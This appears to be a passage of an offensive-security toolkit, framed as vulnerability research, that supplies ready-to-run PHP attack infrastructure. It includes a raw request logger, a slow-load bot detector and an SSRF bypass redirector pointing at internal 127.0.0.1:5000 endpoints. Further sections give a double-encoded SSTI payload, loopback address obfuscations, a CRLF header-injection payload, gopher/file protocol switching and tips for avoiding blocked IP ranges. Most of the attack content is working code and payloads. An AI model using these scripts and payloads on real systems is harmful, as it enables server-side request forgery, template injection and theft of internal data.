
### 1. The "Polyglot" Payload Listener (Advanced Logging)
When researching how different servers (Apache vs. Nginx vs. Flask) interpret the same request, you need to capture the **Raw** input. PHP's `$_GET` and `$_POST` pre-process data (which can hide vulnerabilities). Use this to see the raw, unadulterated attack string.

```php
<?php
// raw_research_logger.php
$log_file = 'research_audit.log';

// Capture the exact, raw URI to see how encoding (%257b vs {) survived
$raw_uri = $_SERVER['REQUEST_URI'];
$raw_headers = apache_request_headers(); // Gets all headers regardless of casing

$output = "========================================\n";
$output .= "TIMESTAMP: " . date('Y-m-d H:i:s') . "\n";
$output .= "SOURCE_IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$output .= "RAW_URI: " . $raw_uri . "\n";
$output .= "USER_AGENT: " . (isset($raw_headers['User-Agent']) ? $raw_headers['User-Agent'] : 'NOT_SET') . "\n";

// Log specific headers that indicate proxy/backend hops
$interesting_headers = ['X-Forwarded-For', 'X-Real-IP', 'Via', 'Server'];
foreach($interesting_headers as $h) {
    if(isset($raw_headers[$h])) $output .= "$h: " . $raw_headers[$h] . "\n";
}

$output .= "BODY_RAW: " . file_get_contents('php://input') . "\n";

file_put_contents($log_file, $output, FILE_APPEND);

// Always return 200 to satisfy "url_check" validators
http_response_code(200);
echo "OK";
?>
```

---

### 2. The "Slow-Loris" Timeout Tester
In GitHub research, you often want to know if a backend is using a "headless" browser (like Selenium or Puppeteer). Browsers wait for a page to load; simple `curl` scripts don't. This PHP script detects the difference by intentionally being slow.

```php
<?php
// detection_slow.php
echo "Starting load...";
flush(); // Push the first bytes to the client

// If the client stays connected for 30 seconds, it's likely a bot/browser
sleep(30);

$log = "Client " . $_SERVER['REMOTE_ADDR'] . " waited 30s. Likely a Browser/Selenium.\n";
file_put_contents('detections.log', $log, FILE_APPEND);

echo "<h1>Load Finished</h1>";
?>
```

---

### 3. Comprehensive SSRF Bypass Script (The "Swiss Army Redirect")
This script handles multiple bypass techniques in one file. You control it via query parameters.

```php
<?php
/* 
Usage: 
?mode=rebind  -> Redirect to internal after 1st hit
?mode=encode  -> Redirect to URL with double-encoded braces
?mode=local   -> Redirect to 127.0.0.1
?mode=pdf     -> Fake a PDF response to fool file-type checkers
*/

$mode = $_GET['mode'] ?? 'default';
$target = "http://127.0.0.1:5000/logs";

switch($mode) {
    case 'rebind':
        session_start();
        if (!isset($_SESSION['val'])) {
            $_SESSION['val'] = true;
            echo "Validation Phase: Status 200";
        } else {
            header("Location: $target");
        }
        break;

    case 'encode':
        // Bypasses regexes that don't recursively decode
        $payload = "%257b%257b%20config.items()%20%257d%257d";
        header("Location: http://google.com/?q=$payload");
        break;

    case 'pdf':
        // Satisfies checks for 'Content-Type: application/pdf'
        header("Content-Type: application/pdf");
        header("Content-Disposition: inline; filename='test.pdf'");
        echo "%PDF-1.4\n1 0 obj\n<< /Title (Exploit) >>\nendobj";
        break;

    case 'local':
        // Direct local redirect
        header("Location: http://localhost:5000/bartender");
        break;

    default:
        echo "Server is UP";
}
?>
```
---

### 4. Logic/Architecture Research Guidance

When documenting research for **GitHub Advisory** or **CVE** submission, focus on these "Advanced Hacks":

#### A. The "Encoding Tunnel" (Double Decoding)
Some applications use multiple libraries.
*   **Library A (Validator)** decodes once: `%257b` → `%7b` (Sees no braces, **ALLOWS**).
*   **Library B (Worker)** decodes again: `%7b` → `{` (Executes **SSTI**).
*   **Audit Step**: Find where `urllib.parse.unquote()` or `html.unescape()` is called in the backend.

#### B. Hostname Fragmentation
If an SSRF filter blocks `127.0.0.1`, use different "Representations":
*   **Decimal**: `http://2130706433/`
*   **Hex**: `http://0x7f000001/`
*   **Short**: `http://127.1/`
*   **DNS**: Use a domain that resolves to `127.0.0.1` (e.g., `local.yourdomain.com`).

#### C. Request Smuggling / CRLF
If you have SSRF, you can sometimes "Inject" extra headers or even a second request by using Newline characters.
*   **Payload**: `http://target.com/api%0d%0aX-Injected-Header:True%0d%0a%0d%0aGET%20/admin`
*   **Research Tip**: Look for SSRF functions where the URL is concatenated into a raw socket or a template without strict character stripping.

### 5. Research Toolkit Summary Checklist
1.  **Always use a Static Public IP**: Ensure your VPS isn't in a blocked range (AWS/GCP are often pre-blocked; try smaller providers like Linode or local ISPs).
2.  **Verify Outbound**: Before testing the exploit, verify your server can actually receive a simple hit from the target `curl http://your-ip:8080/`.
3.  **Tail your logs**: Always have `tail -f requests.log` running. The moment of exploitation is often brief.
4.  **Protocol Switching**: If HTTP is blocked, try `gopher://`, `dict://`, or `file://` if the library supports them.

##
##
